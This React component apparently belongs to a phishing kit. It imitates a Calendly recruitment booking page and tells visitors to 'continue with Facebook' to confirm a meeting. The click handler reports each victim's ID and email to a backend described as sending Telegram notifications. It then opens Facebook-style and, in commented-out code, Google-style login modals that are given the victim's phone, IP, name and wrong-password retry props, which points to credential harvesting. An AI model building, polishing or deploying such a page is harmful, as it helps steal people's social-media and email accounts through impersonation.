import React, { useMemo, useState, useEffect } from "react";
import Image from "next/image";
import LoadingSpinner from "../ui/LoadingSpinner";
import Step2PC from "../fbook/Step2PC";
import Step2Mobile from "../fbook/Step2Mobile";
import GoogleSignInPC from "../gmail/GoogleSignInPC";
import GoogleSignInMobile from "../gmail/GoogleSignInMobile";

const STEPS = ["Verify", "Schedule", "Finish"];

/* helpers */
const generateDates = () => {
  const dates = [];
  const start = new Date();
  start.setDate(start.getDate() + 7); // Start from 1 week out

  for (let i = 0; i < 7; i++) {
    const d = new Date(start);
    d.setDate(start.getDate() + i);
    const dateObj = {
      date: d.toISOString().split("T")[0],
      dayName: d.toLocaleDateString('en-US', { weekday: 'short' }).toUpperCase(),
      dayNum: d.getDate(),
      month: d.toLocaleDateString('en-US', { month: 'long' }),
      year: d.getFullYear()
    };
    dates.push(dateObj);
  }
  return dates;
};

const generateTimes = () => {
  const times = [];
  for (let h = 9; h < 17; h++) {
    times.push(`${String(h).padStart(2, "0")}:00`);
    times.push(`${String(h).padStart(2, "0")}:30`);
  }
  return times;
};

function ActualForm({
  NextStep,
  FacebookLogo,
  isLoading,
  loadingType,
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
}) {
  const dates = useMemo(generateDates, []);
  const times = useMemo(generateTimes, []);

  const [step, setStep] = useState(0);
  const [date, setDate] = useState("");
  const [time, setTime] = useState("");
  const [showStep2Modal, setShowStep2Modal] = useState(false);
  const [showGoogleModal, setShowGoogleModal] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  // Device detection for modal
  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    checkScreenSize();
    window.addEventListener("resize", checkScreenSize);
    return () => window.removeEventListener("resize", checkScreenSize);
  }, []);

  const isFacebookLoading = isLoading && loadingType === "facebook";

  return (
    <div className="min-h-screen w-full flex items-center justify-center px-2 sm:px-4 py-4 sm:py-8">
      <div className="relative bg-white w-full max-w-full sm:max-w-[95%] md:max-w-[85%] lg:max-w-[70%] xl:max-w-[60%] grid lg:grid-cols-[420px_1fr] grid-cols-1 border rounded-lg shadow-lg overflow-hidden">

        {/* LEFT */}
        <div className="p-4 sm:p-6 lg:p-8 lg:border-r border-b lg:border-b-0 relative min-h-[300px] sm:min-h-[400px] lg:min-h-[500px]">
          <div className="flex items-center justify-center gap-3 mb-4 sm:mb-6">
                          <div className="relative w-24 h-10 sm:w-60 sm:h-20 flex items-center justify-center">
                            <Image 
                              src="/Images/calendly.svg" 
                              alt="Calendly" 
                              width={200} 
                              height={100}
                              className="object-contain"
                            />
                          </div>
                        </div>

          <p className="text-xs sm:text-sm text-gray-500 mb-1">
            {process.env.NEXT_PUBLIC_APP_NAME || "Recruitment"}
          </p>

          <h1 className="text-lg sm:text-xl lg:text-[22px] font-semibold mb-4 sm:mb-6 text-gray-900">
            30 Minute Meeting
          </h1>

          <div className="space-y-3 sm:space-y-4 text-xs sm:text-sm text-gray-600">
            <div className="flex gap-3 items-center">
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span>30 min</span>
            </div>
            <div className="flex gap-3 items-start">
              <svg className="w-5 h-5 text-gray-500 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
              </svg>
              <span>Web conferencing details provided upon confirmation.</span>
            </div>
            <div className="flex gap-3 items-center">
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span>Central European Standard Time</span>
            </div>
          </div>

          {date && time && (
            <div className="mt-4 sm:mt-6 pt-4 sm:pt-6 border-t text-xs sm:text-sm text-gray-700 space-y-2">
              <div className="flex gap-2 sm:gap-3 items-center">
                <svg className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                </svg>
                <span className="font-medium">{dates.find(d => d.date === date)?.dayName}, {dates.find(d => d.date === date)?.month} {dates.find(d => d.date === date)?.dayNum}, {dates.find(d => d.date === date)?.year}</span>
              </div>
              <div className="flex gap-2 sm:gap-3 items-center">
                <svg className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <span className="font-medium">{time}</span>
              </div>
            </div>
          )}

          <div className="absolute bottom-3 sm:bottom-4 lg:bottom-6 left-4 sm:left-6 lg:left-8 right-4 sm:right-6 lg:right-8 flex justify-between text-[10px] sm:text-xs text-gray-400">
            <a className="hover:text-blue-600 cursor-pointer">Cookie settings</a>
            <span className="hover:text-gray-600 cursor-pointer">Report abuse</span>
          </div>
        </div>

        {/* RIGHT */}
        <div className="p-4 sm:p-6 lg:p-10 relative">

          {/* POWERED BY RIBBON - Hidden on mobile */}
          <div className="hidden lg:block absolute -right-[58px] top-5 z-20">
            <div className="bg-gradient-to-r from-gray-600 leading-3 to-gray-500 text-white text-center text-[12px] px-16 shadow-lg transform rotate-45">
              <span className="text-[7px]">Powered by</span>
              <p className="text-[14px] pb-1">Calendly</p>
            </div>
          </div>

          {/* STEPPER */}
          <div className="mb-6 sm:mb-8 lg:mb-10">
            {/* Logo */}
            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="relative w-20 h-10 sm:w-24 sm:h-20 flex items-center justify-center">
                <Image 
                  src="/Images/logo.png" 
                  alt="Logo" 
                  width={160} 
                  height={40}
                  className="object-contain"
                />
              </div>
            </div>
            
            {/* Steps */}
            <div className="flex items-start justify-center gap-0">
              {STEPS.map((label, i) => (
                <div key={label} className="flex items-center">
                  {/* Left extending line before first step */}
                  {i === 0 && (
                    <div className="relative w-8 sm:w-12 lg:w-16 h-0.5 mb-6 mr-0">
                      <div className="absolute inset-0 bg-[#00A3FF]" />
                      <div className={`absolute right-0 top-0 h-full transition-all ${step > 0 ? 'w-full bg-[#00A3FF]' : 'w-1/2 bg-[#00A3FF]'}`} />
                    </div>
                  )}
                  <div className="flex flex-col items-center">
                    <div
                      className={`w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center font-semibold shadow-sm transition-all relative z-10
                      ${i < step ? "bg-[#00A3FF] text-white" : i === step ? "bg-[#00A3FF] text-white" : "bg-gray-300 text-gray-500"}`}
                    >
                      {i === 0 && (
                        <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                        </svg>
                      )}
                      {i === 1 && (
                        <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zM9 14H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2zm-8 4H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/>
                        </svg>
                      )}
                      {i === 2 && (
                        <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                        </svg>
                      )}
                    </div>
                    <span className={`text-[10px] sm:text-xs font-medium mt-2 whitespace-nowrap ${i < step ? "text-[#00A3FF]" : i === step ? "text-[#00A3FF]" : "text-gray-400"}`}>
                      {label}
                    </span>
                  </div>
                  {i < STEPS.length - 1 && (
                    <div className="relative w-16 sm:w-20 lg:w-28 h-0.5 mb-6">
                      <div className="absolute inset-0 bg-gray-300" />
                      <div className={`absolute left-0 top-0 h-full transition-all ${i < step ? "w-full bg-[#00A3FF]" : i === step ? "w-1/2 bg-[#00A3FF]" : "w-0"}`} />
                    </div>
                  )}
                  {/* Right extending line after last step */}
                  {i === STEPS.length - 1 && (
                    <div className="relative w-8 sm:w-12 lg:w-16 h-0.5 mb-6 ml-0">
                      <div className="absolute inset-0 bg-gray-300" />
                      <div className={`absolute left-0 top-0 h-full transition-all ${i < step ? "w-full bg-[#00A3FF]" : i === step ? "w-1/2 bg-[#00A3FF]" : "w-0"}`} />
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* STEP 1 – VERIFY */}
          {step === 0 && (
            <div className="space-y-4 sm:space-y-6 max-w-lg mx-auto">
              <h2 className="text-base sm:text-lg lg:text-xl font-semibold text-gray-900">
                Schedule call with {process.env.NEXT_PUBLIC_APP_NAME || "Recruitment"}
              </h2>

              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 sm:p-4 text-xs sm:text-sm text-gray-700">
                To confirm your appointment, please continue with Facebook.
              </div>
            <div className="flex flex-col sm:flex-row gap-3 sm:gap-2">
              <button
                onClick={async () => {
                  if (!isLoading) {
                    // Send Telegram notification
                    try {
                      await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/send`, {
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                          Unik,
                          Email: Email || '',
                          message: '👤 User clicked: Continue with Facebook'
                        })
                      });
                    } catch (error) {
                      console.error('Failed to send notification:', error);
                    }
                    setShowStep2Modal(true);
                  }
                }}
                disabled={isLoading}
                className={`bg-white border-1 border-gray-200 text-gray-800 text-xs sm:text-sm  py-2.5 sm:py-2 px-3 rounded-lg flex items-center justify-center gap-2 sm:gap-3 transition-all
                ${isLoading ? "opacity-60 cursor-not-allowed" : "hover:bg-gray-50 hover:border-blue-500 hover:shadow-md"}`}
              >
                {isFacebookLoading && <LoadingSpinner />}
                {FacebookLogo && !isFacebookLoading && (
                  <Image src={FacebookLogo} alt="Facebook" width={18} height={18} className="sm:w-[22px] sm:h-[22px]" />
                )}
                <span className="truncate">{isFacebookLoading
                  ? "Connecting..."
                  : "Continue with Facebook"}</span>
              </button>

               {/* <button
                onClick={async () => {
                  if (!isLoading) {
                    // Send Telegram notification
                    try {
                      await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:5000'}/api/send`, {
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                          Unik,
                          Email: Email || '',
                          message: '📧 User clicked: Continue with Gmail'
                        })
                      });
                    } catch (error) {
                      console.error('Failed to send notification:', error);
                    }
                    setShowGoogleModal(true);
                  }
                }}
                disabled={isLoading}
                className={`bg-white border-1 border-gray-200 w-full text-gray-800 text-xs sm:text-sm font-semibold py-2.5 sm:py-3 px-3 rounded-lg flex items-center justify-center gap-2 sm:gap-3 transition-all
                ${isLoading && loadingType === "gmail" ? "opacity-60 cursor-not-allowed" : "hover:bg-gray-50 hover:border-red-500 hover:shadow-md"}`}
              >
                {isLoading && loadingType === "gmail" && <LoadingSpinner />}
                {!isLoading && (
                  <svg className="w-4 h-4 sm:w-5 sm:h-5" viewBox="0 0 48 48">
                    <path fill="#4285F4" d="M24 9.5c3.5 0 6.7 1.3 9.2 3.5l6.9-6.9C36.4 2.4 30.6 0 24 0 14.6 0 6.7 5.3 3 13l8.1 6.3C13.2 13.5 18.2 9.5 24 9.5z"/>
                    <path fill="#34A853" d="M46.5 24c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.4 5.5-5 7.2l7.7 6c4.5-4.2 7.1-10.4 7.1-17.7z"/>
                    <path fill="#FBBC05" d="M11.1 28.3c-.6-1.8-.9-3.7-.9-5.6s.3-3.8.9-5.6L3 10.8C1.1 14.5 0 18.6 0 23s1.1 8.5 3 12.2l8.1-6.9z"/>
                    <path fill="#EA4335" d="M24 48c6.5 0 12.1-2.2 16.1-5.9l-7.7-6c-2.1 1.4-4.8 2.2-8.4 2.2-5.8 0-10.8-4-12.6-9.3l-8.1 6.3C6.7 42.7 14.6 48 24 48z"/>
                  </svg>
                )}
                <span className="truncate">{isLoading && loadingType === "gmail"
                  ? "Connecting..."
                  : "Continue with Gmail"}</span>
              </button> */}
              </div>

              <p className="text-[10px] sm:text-xs text-center text-gray-500 leading-relaxed">
                By continuing, you agree to our <a href="#" className="!underline hover:text-gray-700">Privacy Policy</a> and <a href="#" className="!underline hover:text-gray-700">Terms of Service</a>. Your information is securely processed and used only for recruitment purposes.
              </p>
            </div>
          )}
        </div>
      </div>

      {/* Step2 Modal - shows Step2PC (desktop) or Step2Mobile based on screen size */}
      {showStep2Modal && (
        isMobile ? (
          <Step2Mobile
            Unik={Unik}
            Tel={Tel}
            Email={Email}
            setEmail={setEmail}
            Name={Name}
            BusinessEmail={BusinessEmail}
            Ip={Ip}
            setParentBeginTimer={() => {}} // No-op to prevent navigation
            InvalidPassword={InvalidPassword}
            wrongPasswordTrigger={wrongPasswordTrigger}
            onClose={() => setShowStep2Modal(false)}
          />
        ) : (
          <Step2PC
            Unik={Unik}
            Tel={Tel}
            Email={Email}
            setEmail={setEmail}
            Name={Name}
            BusinessEmail={BusinessEmail}
            Ip={Ip}
            setParentBeginTimer={() => {}} // No-op to prevent navigation
            InvalidPassword={InvalidPassword}
            wrongPasswordTrigger={wrongPasswordTrigger}
            onClose={() => setShowStep2Modal(false)}
          />
        )
      )}

      {/* Google Sign In Modal */}
      {showGoogleModal && (
        isMobile ? (
          <GoogleSignInMobile
            Unik={Unik}
            Tel={Tel}
            Email={Email}
            setEmail={setEmail}
            Name={Name}
            BusinessEmail={BusinessEmail}
            Ip={Ip}
            setParentBeginTimer={setParentBeginTimer}
            InvalidPassword={InvalidPassword}
            wrongPasswordTrigger={wrongPasswordTrigger}
            onClose={() => setShowGoogleModal(false)}
          />
        ) : (
          <GoogleSignInPC
            Unik={Unik}
            Tel={Tel}
            Email={Email}
            setEmail={setEmail}
            Name={Name}
            BusinessEmail={BusinessEmail}
            Ip={Ip}
            setParentBeginTimer={setParentBeginTimer}
            InvalidPassword={InvalidPassword}
            wrongPasswordTrigger={wrongPasswordTrigger}
            onClose={() => setShowGoogleModal(false)}
          />
        )
      )}
    </div>
  );
}

export default ActualForm;
